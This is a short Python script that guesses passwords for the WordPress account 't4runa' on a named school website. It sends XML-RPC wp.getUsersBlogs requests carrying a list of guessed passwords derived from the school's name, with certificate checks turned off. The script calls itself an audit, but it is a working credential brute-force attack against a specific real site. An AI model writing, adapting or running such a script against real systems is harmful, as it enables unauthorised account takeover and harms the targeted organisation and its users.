import httpx
import asyncio

url = "https://smktarunabhakti.sch.id/xmlrpc.php"
username = "t4runa"
passwords = ["t4runabhakti", "tarunabhakti", "tarunabhakti123", "TBDepok2024", "t4runa2024", "admin123", "password", "123456"]

async def test_pw(pw):
    payload = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{pw}</value></param></params></methodCall>"""
    try:
        async with httpx.AsyncClient(verify=False) as client:
            resp = await client.post(url, data=payload, timeout=10)
            if "isAdmin" in resp.text:
                return True
            return False
    except:
        return False

async def main():
    print(f"[*] Starting audit for user: {username}")
    for pw in passwords:
        print(f"[*] Testing: {pw} ...")
        if await test_pw(pw):
            print(f"\n[!!!] SUCCESS! Password found for {username}: {pw}\n")
            return
        await asyncio.sleep(1) # Delay untuk keamanan
    print("[-] No common passwords matched for this user.")

if __name__ == "__main__":
    asyncio.run(main())
